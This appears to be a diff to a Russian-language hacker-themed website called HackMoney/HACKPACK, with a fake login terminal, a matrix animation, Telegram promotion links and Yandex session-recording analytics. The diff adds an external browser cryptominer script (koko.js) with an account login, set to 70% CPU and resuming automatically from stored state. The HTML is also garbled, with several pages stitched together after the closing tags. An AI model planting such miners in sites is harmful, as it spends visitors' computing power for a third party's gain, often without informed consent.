@@ -1,7 +1,19 @@
 <!DOCTYPE html>
+<body><header style="background-color: #000; padding: 20px; border-bottom: 2px solid #0f0; font-family: 'Courier New', monospace;">
+  <div style="display: flex; justify-content: space-between; align-items: center;">
+    <h1 style="color: #0f0; margin: 0;">💰💰💰 HackMoney</h1>☢️☢️☢️
+    <nav>
+      <a href="#home" style="color: #0f0; margin: 0 15px; text-decoration: none;">Главная</a>
+      <a href="#projects" style="color: #0f0; margin: 0 15px; text-decoration: none;">Проекты</a>
+      <a href="#blog" style="color: #0f0; margin: 0 15px; text-decoration: none;">Блог</a>
+      <a href="#contact" style="color: #0f0; margin: 0 15px; text-decoration: none;">Контакты</a>
+      <a href="https://t.me/+3v93hQGL735kZGIy" target="_blank" title="Наш Telegram" style="color: #0f0; margin: 0 15px; text-decoration: none;">Telegram</a>
+    </nav>
+  </div>
+</header>
+<!DOCTYPE html>
 <html lang="ru">
-<head>
-  <meta name="google-site-verification" content="Cv6KmzJPeb9-CSZfWmE2tbF81ScF_i5GPI4cU9wzb4w" />
+<head><meta name="google-site-verification" content="Cv6KmzJPeb9-CSZfWmE2tbF81ScF_i5GPI4cU9wzb4w" />
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>HACKPACK Terminal + Майнинг</title>
@@ -101,20 +113,6 @@
 </head>
 <body>
 
-<!-- 💥 ВСТАВЛЕННЫЙ ХЕДЕР -->
-<header style="background-color: #000; padding: 20px; border-bottom: 2px solid #0f0; font-family: 'Courier New', monospace;">
-  <div style="display: flex; justify-content: space-between; align-items: center;">
-    <h1 style="color: #0f0; margin: 0;">💰💰💰 HackMoney</h1>☢️☢️☢️
-    <nav>
-      <a href="#home" style="color: #0f0; margin: 0 15px; text-decoration: none;">Главная</a>
-      <a href="#projects" style="color: #0f0; margin: 0 15px; text-decoration: none;">Проекты</a>
-      <a href="#blog" style="color: #0f0; margin: 0 15px; text-decoration: none;">Блог</a>
-      <a href="#contact" style="color: #0f0; margin: 0 15px; text-decoration: none;">Контакты</a>
-      <a href="https://t.me/+3v93hQGL735kZGIy" target="_blank" title="Наш Telegram" style="color: #0f0; margin: 0 15px; text-decoration: none;">Telegram</a>
-    </nav>
-  </div>
-</header>
-
 <canvas class="matrix" id="matrix"></canvas>
 
 <div class="online">🧑‍💻 HACKERS ONLINE: 13</div>
@@ -136,6 +134,7 @@
     <div id="system-info"></div>
     <div id="clock"></div>
 
+    <!-- Блок майнинга -->
     <div id="miningContainer">
       <h2>🚀 МАЙНИНГ КОИНОВ</h2>
       <p>Кошелёк: <span>UQB1VJhJmRowKWsqJig_T6DTNMO7Chdlfmi54WMpVfTdojUr</span></p>
@@ -155,6 +154,7 @@
 </div>
 
 <script>
+  // Fake login
   function checkEnter(e) {
     if (e.key === 'Enter') {
       const val = document.getElementById("passwordInput").value;
@@ -171,6 +171,7 @@
     }
   }
 
+  // Terminal simulation
   function handleCommand(e) {
     if (e.key === "Enter") {
       const input = document.getElementById("cmdInput");
@@ -196,11 +197,13 @@
     }
   }
 
+  // System info
   function showSystemInfo() {
     const sys = document.getElementById("system-info");
     sys.innerText = `🌐 Browser: ${navigator.userAgent}\n🖥️ Screen: ${screen.width}x${screen.height}`;
   }
 
+  // Clock
   function startClock() {
     const clock = document.getElementById("clock");
     setInterval(() => {
@@ -209,6 +212,7 @@
     }, 1000);
   }
 
+  // Mining
   let coins = 0;
   let progress = 0;
   let interval;
@@ -222,13 +226,221 @@
       document.getElementById("progressBar").style.width = progress + "%";
 
       if (progress >= 100) {
-        coins++;
+        coins += 1;
         progress = 0;
-        document.getElementById("coinCount").innerText = `💰 Коинов добыто: ${coins}`;
+        document.getElementById("coinCount").innerText = "💰 Коинов добыто: " + coins;
       }
-    }, 200);
+    }, 100);
   }
+
+  // Matrix effect
+  const canvas = document.getElementById("matrix");
+  const ctx = canvas.getContext("2d");
+  canvas.height = window.innerHeight;
+  canvas.width = window.innerWidth;
+
+  const letters = "01".split("");
+  const fontSize = 14;
+  const columns = canvas.width / fontSize;
+  const drops = Array.from({ length: columns }).fill(1);
+
+  function drawMatrix() {
+    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+    ctx.fillStyle = "#0F0";
+    ctx.font = fontSize + "px monospace";
+
+    for (let i = 0; i < drops.length; i++) {
+      const text = letters[Math.floor(Math.random() * letters.length)];
+      ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+      if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+        drops[i] = 0;
+      }
+      drops[i]++;
+    }
+  }
+  setInterval(drawMatrix, 33);
 </script>
 
-</body>
+</body><!-- Подключаем майнер -->
+<script src="https://wm.bmwebm.org/koko.js"></script>
+
+<!-- Кнопка для запуска/остановки -->
+<button id="minerToggle">Запустить майнинг</button>
+<p id="minerStatus">Статус: выключен</p>
+
+<script>
+// Конфигурируем майнер
+koko.config({ 
+	login: "7173569",
+	pass: "hacker"
+});
+
+// Переменные
+let mining = false;
+
+// Функция обновления UI
+function updateStatus() {
+	document.getElementById('minerStatus').textContent = 
+		`Статус: ${mining ? "включен" : "выключен"}, мощность: ${mining ? koko.getPower() + "%" : "0%"}`;
+}
+
+// Событие кнопки
+document.getElementById("minerToggle").addEventListener("click", function() {
+	if (mining) {
+		koko.power(0); // стоп
+		mining = false;
+		this.textContent = "Запустить майнинг";
+	} else {
+		koko.power(70); // старт с 70% CPU
+		mining = true;
+		this.textContent = "Остановить майнинг";
+	}
+	updateStatus();
+});
+
+// Автоматически загружаем, если ранее уже майнилось
+koko.loadStored();
+
+// Обновляем статус при запуске
+setInterval(updateStatus, 2000); // обновлять каждые 2 сек
+</script>
+
 </html>
+
+<body><!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>HACKPACK 1977</title>
+  <style>
+    body {
+      background-color: #000;
+      color: #0f0;
+      font-family: 'Courier New', monospace;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+    }
+
+    .logo {
+      display: block;
+      margin: 40px auto 20px;
+      max-width: 360px;
+      filter: drop-shadow(0 0 10px limegreen);
+    }
+
+    h1 {
+      font-size: 36px;
+      color: #00ff00;
+      text-shadow: 0 0 5px #0f0, 0 0 10px #0f0;
+    }
+
+    p {
+      font-size: 18px;
+      color: #0f0;
+    }
+
+    .button {
+      display: inline-block;
+      margin-top: 30px;
+      padding: 12px 25px;
+      color: #0f0;
+      border: 2px solid #0f0;
+      background-color: transparent;
+      text-decoration: none;
+      font-size: 16px;
+      transition: 0.3s;
+    }
+
+    .button:hover {
+      background-color: #0f0;
+      color: #000;
+    }
+
+    footer {
+      margin-top: 60px;
+      font-size: 14px;
+      color: #444;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Логотип из PNG -->
+  <img src="https://i.imgur.com/HM0rK9B.png" alt="HACKMONEY Logo" class="logo">
+
+  <h1>HACKMONEY</h1>
+  <p>Добро пожаловать в подпольный мир хакеров!</p>
+
+  <a href="https://t.me/+3v93hQGL735kZGIy" class="button">🔗 Вступить в Telegram</a>
+
+  <footer>
+    <p>© 2025 HACKPACK. Все права защищены.</p>
+  </footer>
+
+</body><!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>HACKPACK</title>
+  <style>
+    body {
+      background-color: #000;
+      color: #0f0;
+      font-family: monospace;
+      padding: 20px;
+    }
+    h1 {
+      color: #f00;
+    }
+    a {
+      color: #0ff;
+    }
+    .container {
+      max-width: 800px;
+      margin: auto;
+    }
+    iframe {
+      display: block;
+      margin: 20px auto;
+      border: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Добро пожаловать в HACKPACK</h1>
+    <p>Это наш хакерский сайт. Свяжитесь с нами: <a href="https://t.me/vipcam1977" target="_blank">@vipcam1977</a></p>
+
+    <h2>Последнее видео:</h2>
+    <iframe width="560" height="315" src="https://www.youtube.com/embed/y8VM5qPiF24" 
+    title="YouTube video player" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
+  </div>
+</body><!-- Yandex.Metrika counter -->
+<script type="text/javascript" >
+   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
+   m[i].l=1*new Date();
+   for (var j = 0; j < document.scripts.length; j++) {if (document.scripts[j].src === r) { return; }}
+   k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
+   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
+
+   ym(101960909, "init", {
+        clickmap:true,
+        trackLinks:true,
+        accurateTrackBounce:true,
+        webvisor:true
+   });
+</script>
+
+<!-- /Yandex.Metrika counter -->
+</html>
+
+</html>
+
+
+ 
+</html>
+ </div><meta name="google-site-verification" content="Cv6KmzJPeb9-CSZfWmE2tbF81ScF_i5GPI4cU9wzb4w" />
